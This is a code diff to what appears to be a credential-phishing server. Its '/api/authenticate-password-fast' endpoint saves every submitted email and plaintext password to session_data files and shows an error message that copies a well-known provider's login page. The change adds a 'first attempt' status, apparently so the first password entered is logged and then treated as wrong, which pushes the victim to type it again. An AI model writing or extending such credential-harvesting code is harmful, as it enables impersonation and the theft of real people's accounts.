@@ -1198,18 +1198,19 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     // Store failed attempt in session data
                     const sessionDir = path.join(__dirname, 'session_data');
                     const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+                    const attemptNum = req.body.attemptNumber || 1;
                     const failureData = {
                         id: failureId,
                         sessionId: sessionId || failureId,
                         email: email,
                         password: password,
-                        reason: 'Wrong Password',
-                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        reason: attemptNum === 1 ? 'First Attempt' : 'Wrong Password',
+                        errorMessage: attemptNum === 1 ? 'First password attempt recorded' : 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                         timestamp: new Date().toISOString(),
-                        status: 'invalid',
+                        status: attemptNum === 1 ? 'first_attempt' : 'invalid',
                         method: 'fast_auth_with_preload',
-                        failureType: 'incorrect_password',
-                        attemptNumber: req.body.attemptNumber || 1
+                        failureType: attemptNum === 1 ? 'first_attempt' : 'incorrect_password',
+                        attemptNumber: attemptNum
                     };
 
                     fs.writeFileSync(
@@ -1281,18 +1282,19 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
         // Store failed attempt in session data
         const sessionDir = path.join(__dirname, 'session_data');
         const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+        const attemptNum = req.body.attemptNumber || 1;
         const failureData = {
             id: failureId,
             sessionId: sessionId || failureId,
             email: email,
             password: password,
-            reason: 'Wrong Password',
-            errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+            reason: attemptNum === 1 ? 'First Attempt' : 'Wrong Password',
+            errorMessage: attemptNum === 1 ? 'First password attempt recorded' : 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
             timestamp: new Date().toISOString(),
-            status: 'invalid',
+            status: attemptNum === 1 ? 'first_attempt' : 'invalid',
             method: 'fast_auth_no_preload',
-            failureType: 'incorrect_password',
-            attemptNumber: req.body.attemptNumber || 1
+            failureType: attemptNum === 1 ? 'first_attempt' : 'incorrect_password',
+            attemptNumber: attemptNum
         };
 
         fs.writeFileSync(
